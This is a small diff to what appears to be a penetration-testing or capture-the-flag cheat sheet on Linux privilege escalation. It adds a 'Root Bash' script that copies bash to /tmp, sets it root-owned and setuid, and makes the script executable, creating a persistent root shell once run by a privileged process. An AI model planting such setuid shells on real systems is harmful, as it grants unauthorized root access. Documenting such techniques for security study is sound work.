@@ -19,4 +19,15 @@ root@xxx$
 
 📚 Replace `root` with another user according to the attack vector.
 </div><div>
+
+**Root Bash** (script)
+
+```shell!
+$ cat /tmp/root.sh
+cp /bin/bash /tmp/rootbash
+chown root /tmp/rootbash
+chmod +s /tmp/rootbash
+exit 0
+$ chmod +x /tmp/root.sh
+```
 </div></div>
